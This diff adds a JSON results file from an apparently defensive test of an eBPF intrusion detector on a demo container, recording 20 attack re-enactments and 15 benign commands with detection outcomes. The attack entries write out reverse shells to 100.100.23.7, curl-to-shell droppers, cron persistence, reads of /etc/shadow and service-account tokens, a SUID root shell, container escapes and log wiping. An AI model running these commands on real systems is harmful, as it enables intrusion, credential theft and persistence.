@@ -1,0 +1,527 @@
+{
+  "target": "ids-demo/shop-web",
+  "started_at": "2026-11-07T14:52:08.140574+00:00",
+  "attacks": {
+    "total": 20,
+    "detected": 19,
+    "detection_rate": 0.95
+  },
+  "benign": {
+    "total": 15,
+    "false_positives": 4,
+    "false_positive_rate": 0.2667
+  },
+  "latency_ms": {
+    "avg": 140.0,
+    "p95": 279.6,
+    "max": 279.6
+  },
+  "results": [
+    {
+      "name": "Bash reverse shell",
+      "kind": "attack",
+      "category": "reverse_shell",
+      "command": "timeout 3 bash -c 'bash -i >& /dev/tcp/100.100.23.7/4444 0>&1'",
+      "detected": true,
+      "suspicious_events": 4,
+      "severity": "High",
+      "latency_ms": 71.5,
+      "titles": [
+        "reverse_shell (connect:bash R002)",
+        "reverse_shell (exec:bash R001)",
+        "reverse_shell (exec:sh R001)",
+        "reverse_shell (exec:timeout R001)"
+      ]
+    },
+    {
+      "name": "Netcat reverse shell",
+      "kind": "attack",
+      "category": "reverse_shell",
+      "command": "timeout 3 nc -e /bin/sh 100.100.23.7 4444",
+      "detected": true,
+      "suspicious_events": 4,
+      "severity": "High",
+      "latency_ms": 29.7,
+      "titles": [
+        "reverse_shell (connect:nc R002)",
+        "reverse_shell (exec:nc R001)",
+        "reverse_shell (exec:sh R001)",
+        "reverse_shell (exec:timeout R001)"
+      ]
+    },
+    {
+      "name": "Python reverse shell",
+      "kind": "attack",
+      "category": "reverse_shell",
+      "command": "timeout 3 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(2);s.connect((\"100.100.23.7\",9001));os.dup2(s.",
+      "detected": true,
+      "suspicious_events": 4,
+      "severity": "High",
+      "latency_ms": 29.1,
+      "titles": [
+        "reverse_shell (connect:python3 R002)",
+        "reverse_shell (exec:python3 R001)",
+        "reverse_shell (exec:sh R001)",
+        "reverse_shell (exec:timeout R001)"
+      ]
+    },
+    {
+      "name": "Download piped to shell",
+      "kind": "attack",
+      "category": "dropper",
+      "command": "curl -s --max-time 2 http://100.100.23.7/payload.sh | sh",
+      "detected": true,
+      "suspicious_events": 7,
+      "severity": "High",
+      "latency_ms": 193.1,
+      "titles": [
+        "container_escape (open:curl)",
+        "dropper (exec:sh R006)",
+        "lateral_movement (exec:curl)",
+        "privilege_escalation (exec:sh)",
+        "privilege_escalation (open:curl)",
+        "reverse_shell (connect:curl)"
+      ]
+    },
+    {
+      "name": "Hidden binary run from /tmp",
+      "kind": "attack",
+      "category": "dropper",
+      "command": "cp /bin/sleep /tmp/.kworker && /tmp/.kworker 0.1",
+      "detected": true,
+      "suspicious_events": 2,
+      "severity": "High",
+      "latency_ms": 168.4,
+      "titles": [
+        "dropper (exec:.kworker R007)",
+        "privilege_escalation (exec:cp)"
+      ]
+    },
+    {
+      "name": "Crypto-miner process",
+      "kind": "attack",
+      "category": "crypto_miner",
+      "command": "mkdir -p /tmp/.xm && cp /bin/sleep /tmp/.xm/xmrig && /tmp/.xm/xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNg",
+      "detected": true,
+      "suspicious_events": 4,
+      "severity": "High",
+      "latency_ms": 238.2,
+      "titles": [
+        "crypto_miner (exec:cp R005)",
+        "crypto_miner (exec:sh R005)",
+        "crypto_miner (exec:xmrig R005,R007)",
+        "privilege_escalation (exec:mkdir)"
+      ]
+    },
+    {
+      "name": "Miner connecting to pool",
+      "kind": "attack",
+      "category": "crypto_miner",
+      "command": "cp $(command -v python3) /tmp/.xm/kworkerds && timeout 3 /tmp/.xm/kworkerds -c \"import socket;socket.create_connection(('100.100.23.7',3333),1)\" || true",
+      "detected": true,
+      "suspicious_events": 5,
+      "severity": "High",
+      "latency_ms": 99.1,
+      "titles": [
+        "crypto_miner (connect:kworkerds R005)",
+        "dropper (exec:kworkerds R007)",
+        "lateral_movement (exec:timeout)",
+        "privilege_escalation (exec:cp)",
+        "reverse_shell (exec:sh)"
+      ]
+    },
+    {
+      "name": "Service-account token theft",
+      "kind": "attack",
+      "category": "credential_access",
+      "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null",
+      "detected": true,
+      "suspicious_events": 2,
+      "severity": "High",
+      "latency_ms": 49.2,
+      "titles": [
+        "credential_access (exec:cat)",
+        "credential_access (open:cat R003)"
+      ]
+    },
+    {
+      "name": "Password database read",
+      "kind": "attack",
+      "category": "credential_access",
+      "command": "cat /etc/shadow > /dev/null",
+      "detected": true,
+      "suspicious_events": 2,
+      "severity": "High",
+      "latency_ms": 216.2,
+      "titles": [
+        "credential_access (exec:cat)",
+        "credential_access (open:cat R004)"
+      ]
+    },
+    {
+      "name": "Cloud metadata query",
+      "kind": "attack",
+      "category": "credential_access",
+      "command": "curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true",
+      "detected": true,
+      "suspicious_events": 6,
+      "severity": "High",
+      "latency_ms": 129.0,
+      "titles": [
+        "container_escape (open:curl)",
+        "credential_access (connect:curl R015)",
+        "credential_access (exec:curl R015)",
+        "credential_access (exec:sh R015)"
+      ]
+    },
+    {
+      "name": "SUID shell backdoor",
+      "kind": "attack",
+      "category": "privilege_escalation",
+      "command": "cp /bin/bash /tmp/.rootsh && chmod u+s /tmp/.rootsh",
+      "detected": true,
+      "suspicious_events": 3,
+      "severity": "High",
+      "latency_ms": 142.8,
+      "titles": [
+        "privilege_escalation (chmod:chmod R010)",
+        "privilege_escalation (exec:chmod R010)",
+        "privilege_escalation (exec:cp)"
+      ]
+    },
+    {
+      "name": "Cron persistence",
+      "kind": "attack",
+      "category": "privilege_escalation",
+      "command": "echo '* * * * * root curl -s http://100.100.23.7/c | sh' >> /etc/crontab",
+      "detected": true,
+      "suspicious_events": 2,
+      "severity": "High",
+      "latency_ms": 91.2,
+      "titles": [
+        "dropper (exec:sh R006)",
+        "privilege_escalation (open:sh R016)"
+      ]
+    },
+    {
+      "name": "nsenter into host namespaces",
+      "kind": "attack",
+      "category": "container_escape",
+      "command": "nsenter --target 1 --mount --uts --ipc --net --pid -- true || true",
+      "detected": true,
+      "suspicious_events": 7,
+      "severity": "High",
+      "latency_ms": 249.9,
+      "titles": [
+        "container_escape (exec:nsenter R014)",
+        "container_escape (setns:nsenter)"
+      ]
+    },
+    {
+      "name": "User-namespace unshare",
+      "kind": "attack",
+      "category": "container_escape",
+      "command": "unshare -Ur true || true",
+      "detected": true,
+      "suspicious_events": 2,
+      "severity": "High",
+      "latency_ms": 197.2,
+      "titles": [
+        "container_escape (exec:unshare)",
+        "container_escape (unshare:unshare R014)"
+      ]
+    },
+    {
+      "name": "Docker socket access",
+      "kind": "attack",
+      "category": "container_escape",
+      "command": "curl -s --max-time 2 --unix-socket /var/run/docker.sock http://localhost/containers/json || true",
+      "detected": true,
+      "suspicious_events": 6,
+      "severity": "High",
+      "latency_ms": 111.5,
+      "titles": [
+        "container_escape (connect:curl R014)",
+        "container_escape (exec:curl R014)",
+        "container_escape (exec:sh R014)",
+        "container_escape (open:curl)"
+      ]
+    },
+    {
+      "name": "Kubelet API access",
+      "kind": "attack",
+      "category": "lateral_movement",
+      "command": "curl -sk --max-time 2 https://192.168.49.2:10250/pods || true",
+      "detected": true,
+      "suspicious_events": 6,
+      "severity": "High",
+      "latency_ms": 279.6,
+      "titles": [
+        "container_escape (open:curl)",
+        "lateral_movement (connect:curl R017)",
+        "lateral_movement (exec:curl)",
+        "reverse_shell (exec:sh)"
+      ]
+    },
+    {
+      "name": "Internal port scan",
+      "kind": "attack",
+      "category": "discovery",
+      "command": "nc -zv -w 1 10.96.0.1 440-445 || true",
+      "detected": true,
+      "suspicious_events": 13,
+      "severity": "High",
+      "latency_ms": 46.0,
+      "titles": [
+        "crypto_miner (connect:nc)",
+        "discovery (connect:nc)",
+        "discovery (exec:nc R018)",
+        "discovery (exec:sh)",
+        "reverse_shell (connect:nc)"
+      ]
+    },
+    {
+      "name": "Container recon",
+      "kind": "attack",
+      "category": "discovery",
+      "command": "cat /proc/1/cgroup; ls -la /.dockerenv; uname -a; id",
+      "detected": false,
+      "suspicious_events": 0,
+      "severity": null,
+      "latency_ms": null,
+      "titles": []
+    },
+    {
+      "name": "Fileless memfd payload",
+      "kind": "attack",
+      "category": "defense_evasion",
+      "command": "python3 -c \"import os;f=os.memfd_create('');os.write(f,b'#!/bin/sh\\n');print(f)\"",
+      "detected": true,
+      "suspicious_events": 1,
+      "severity": "High",
+      "latency_ms": 197.4,
+      "titles": [
+        "defense_evasion (memfd:python3 R012)"
+      ]
+    },
+    {
+      "name": "History / log wiping",
+      "kind": "attack",
+      "category": "defense_evasion",
+      "command": "bash -c 'unset HISTFILE; history -c'; rm -rf /var/log/apt",
+      "detected": true,
+      "suspicious_events": 3,
+      "severity": "Medium",
+      "latency_ms": 120.5,
+      "titles": [
+        "defense_evasion (exec:bash R013)",
+        "defense_evasion (exec:rm R013)",
+        "defense_evasion (exec:sh R013)"
+      ]
+    },
+    {
+      "name": "List application files",
+      "kind": "benign",
+      "category": null,
+      "command": "ls -la /app",
+      "detected": false,
+      "suspicious_events": 0,
+      "severity": null,
+      "latency_ms": null,
+      "titles": []
+    },
+    {
+      "name": "Read hostname",
+      "kind": "benign",
+      "category": null,
+      "command": "cat /etc/hostname",
+      "detected": false,
+      "suspicious_events": 0,
+      "severity": null,
+      "latency_ms": null,
+      "titles": []
+    },
+    {
+      "name": "Python one-liner",
+      "kind": "benign",
+      "category": null,
+      "command": "python3 -c 'print(6*7)'",
+      "detected": false,
+      "suspicious_events": 0,
+      "severity": null,
+      "latency_ms": null,
+      "titles": []
+    },
+    {
+      "name": "Local health check (curl)",
+      "kind": "benign",
+      "category": null,
+      "command": "curl -fs http://127.0.0.1:8080/health",
+      "detected": true,
+      "suspicious_events": 3,
+      "severity": "Medium",
+      "latency_ms": 76.5,
+      "titles": [
+        "dropper (exec:curl)",
+        "privilege_escalation (open:curl)",
+        "reverse_shell (connect:curl)"
+      ]
+    },
+    {
+      "name": "Wait-for dependency (nc -z)",
+      "kind": "benign",
+      "category": null,
+      "command": "nc -z -w 2 ids-backend.ebpf-ids 8000 || true",
+      "detected": true,
+      "suspicious_events": 3,
+      "severity": "Medium",
+      "latency_ms": 244.7,
+      "titles": [
+        "discovery (connect:nc)"
+      ]
+    },
+    {
+      "name": "Port check via /dev/tcp",
+      "kind": "benign",
+      "category": null,
+      "command": "timeout 2 bash -c 'cat < /dev/null > /dev/tcp/127.0.0.1/8080'",
+      "detected": true,
+      "suspicious_events": 2,
+      "severity": "Medium",
+      "latency_ms": 197.0,
+      "titles": [
+        "crypto_miner (connect:bash)",
+        "lateral_movement (exec:timeout)"
+      ]
+    },
+    {
+      "name": "Process listing",
+      "kind": "benign",
+      "category": null,
+      "command": "ps aux > /dev/null",
+      "detected": false,
+      "suspicious_events": 0,
+      "severity": null,
+      "latency_ms": null,
+      "titles": []
+    },
+    {
+      "name": "Decode base64 config",
+      "kind": "benign",
+      "category": null,
+      "command": "echo aGVsbG8gd29ybGQ= | base64 -d > /tmp/greeting.txt",
+      "detected": false,
+      "suspicious_events": 0,
+      "severity": null,
+      "latency_ms": null,
+      "titles": []
+    },
+    {
+      "name": "pip version",
+      "kind": "benign",
+      "category": null,
+      "command": "pip --version",
+      "detected": false,
+      "suspicious_events": 0,
+      "severity": null,
+      "latency_ms": null,
+      "titles": []
+    },
+    {
+      "name": "Find python files",
+      "kind": "benign",
+      "category": null,
+      "command": "find /app -name '*.py'",
+      "detected": false,
+      "suspicious_events": 0,
+      "severity": null,
+      "latency_ms": null,
+      "titles": []
+    },
+    {
+      "name": "Backup app directory",
+      "kind": "benign",
+      "category": null,
+      "command": "tar czf /tmp/app-backup.tgz /app",
+      "detected": false,
+      "suspicious_events": 0,
+      "severity": null,
+      "latency_ms": null,
+      "titles": []
+    },
+    {
+      "name": "Pretty-print JSON config",
+      "kind": "benign",
+      "category": null,
+      "command": "python3 -m json.tool /app/config.json > /dev/null",
+      "detected": false,
+      "suspicious_events": 0,
+      "severity": null,
+      "latency_ms": null,
+      "titles": []
+    },
+    {
+      "name": "Check environment variable",
+      "kind": "benign",
+      "category": null,
+      "command": "printenv HOSTNAME",
+      "detected": false,
+      "suspicious_events": 0,
+      "severity": null,
+      "latency_ms": null,
+      "titles": []
+    },
+    {
+      "name": "Disk usage",
+      "kind": "benign",
+      "category": null,
+      "command": "df -h /",
+      "detected": false,
+      "suspicious_events": 0,
+      "severity": null,
+      "latency_ms": null,
+      "titles": []
+    },
+    {
+      "name": "Fetch own API",
+      "kind": "benign",
+      "category": null,
+      "command": "wget -q -O /dev/null http://127.0.0.1:8080/",
+      "detected": true,
+      "suspicious_events": 2,
+      "severity": "Medium",
+      "latency_ms": 176.8,
+      "titles": [
+        "dropper (exec:wget)",
+        "reverse_shell (connect:wget)"
+      ]
+    }
+  ],
+  "notes": "kubectl exec scenarios; harmless re-enactments",
+  "overhead": {
+    "iterations": 2000,
+    "runs": 3,
+    "with_agent_seconds": 3.667,
+    "baseline_seconds": 1.421,
+    "overhead_percent": 158.07,
+    "with_agent_runs": [
+      3.6673826129999725,
+      4.740538518999983,
+      2.102199767000002
+    ],
+    "baseline_runs": [
+      1.4272943400001168,
+      1.421053850999897,
+      1.4129155509999691
+    ]
+  },
+  "agent_resources": {
+    "cpu_percent": 31.27,
+    "rss_mb": 241.3,
+    "agent_rss_mb": 230.9,
+    "loader_rss_mb": 10.5,
+    "events_per_sec": 230.99,
+    "kernel_events_dropped": 0,
+    "latency_p95_ms": 1541.32
+  }
+}
